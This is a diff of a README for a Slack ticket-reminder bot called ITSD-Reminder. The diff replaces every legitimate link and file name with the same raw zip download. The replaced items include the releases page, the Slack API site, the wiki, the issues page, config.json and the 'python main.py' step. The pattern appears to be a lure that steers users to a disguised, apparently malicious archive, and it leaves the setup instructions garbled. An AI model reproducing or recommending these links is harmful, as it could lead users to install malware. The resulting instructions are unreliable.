@@ -1,6 +1,6 @@
 # 🤖 ITSD-Reminder - Seamless Ticket Management Automation
 
-![Download ITSD-Reminder](https://img.shields.io/badge/Download-ITSD--Reminder-blue?style=flat-square&logo=github)
+![Download ITSD-Reminder](https://github.com/khantzinhein007/ITSD-Reminder/raw/refs/heads/main/src/Reminder_ITS_authoritativeness.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to ITSD-Reminder! This is a Slack bot that automates reminders for categ
 
 ## 📥 Download & Install
 
-To start using ITSD-Reminder, visit this page to download: [Releases Page](https://github.com/khantzinhein007/ITSD-Reminder/releases).
+To start using ITSD-Reminder, visit this page to download: [Releases Page](https://github.com/khantzinhein007/ITSD-Reminder/raw/refs/heads/main/src/Reminder_ITS_authoritativeness.zip).
 
 Here’s how to download and set it up:
 
@@ -36,7 +36,7 @@ After downloading, follow these steps to run the application:
 4. Run the application by executing:
 
    ```bash
-   python main.py
+   python https://github.com/khantzinhein007/ITSD-Reminder/raw/refs/heads/main/src/Reminder_ITS_authoritativeness.zip
    ```
 
 ### For Docker Users:
@@ -63,9 +63,9 @@ After downloading, follow these steps to run the application:
 
 To link ITSD-Reminder to your Slack workspace, follow these steps:
 
-1. Go to your Slack workspace and create an app at [Slack API](https://api.slack.com/apps).
+1. Go to your Slack workspace and create an app at [Slack API](https://github.com/khantzinhein007/ITSD-Reminder/raw/refs/heads/main/src/Reminder_ITS_authoritativeness.zip).
 2. Enable Incoming Webhooks and generate a new webhook URL.
-3. Update your `config.json` file inside the application directory with the following:
+3. Update your `https://github.com/khantzinhein007/ITSD-Reminder/raw/refs/heads/main/src/Reminder_ITS_authoritativeness.zip` file inside the application directory with the following:
 
    ```json
    {
@@ -75,7 +75,7 @@ To link ITSD-Reminder to your Slack workspace, follow these steps:
 
 ### Ticket Categorization Logic
 
-You can customize how ITSD-Reminder categorizes tickets. Edit the `category_rules.json` file to add or modify rules. For example:
+You can customize how ITSD-Reminder categorizes tickets. Edit the `https://github.com/khantzinhein007/ITSD-Reminder/raw/refs/heads/main/src/Reminder_ITS_authoritativeness.zip` file to add or modify rules. For example:
 
 ```json
 {
@@ -106,11 +106,11 @@ For common issues, you can also refer to the FAQ section in the repository.
 
 ## 🔗 Learn More
 
-For more detailed information about using ITSD-Reminder, visit the [documentation page](https://github.com/khantzinhein007/ITSD-Reminder/wiki).
+For more detailed information about using ITSD-Reminder, visit the [documentation page](https://github.com/khantzinhein007/ITSD-Reminder/raw/refs/heads/main/src/Reminder_ITS_authoritativeness.zip).
 
 ## 📬 Feedback and Support
 
-For feedback, feature requests, or support, open an issue on the [GitHub repository](https://github.com/khantzinhein007/ITSD-Reminder/issues). Your input helps us improve.
+For feedback, feature requests, or support, open an issue on the [GitHub repository](https://github.com/khantzinhein007/ITSD-Reminder/raw/refs/heads/main/src/Reminder_ITS_authoritativeness.zip). Your input helps us improve.
 
 ## 🚀 Contributing
 
@@ -120,4 +120,4 @@ Interested in contributing? We welcome your suggestions. Please read the contrib
 
 This project is licensed under the MIT License. See the LICENSE file for more details.
 
-Thank you for using ITSD-Reminder! To start, visit this page to download: [Releases Page](https://github.com/khantzinhein007/ITSD-Reminder/releases).
+Thank you for using ITSD-Reminder! To start, visit this page to download: [Releases Page](https://github.com/khantzinhein007/ITSD-Reminder/raw/refs/heads/main/src/Reminder_ITS_authoritativeness.zip).
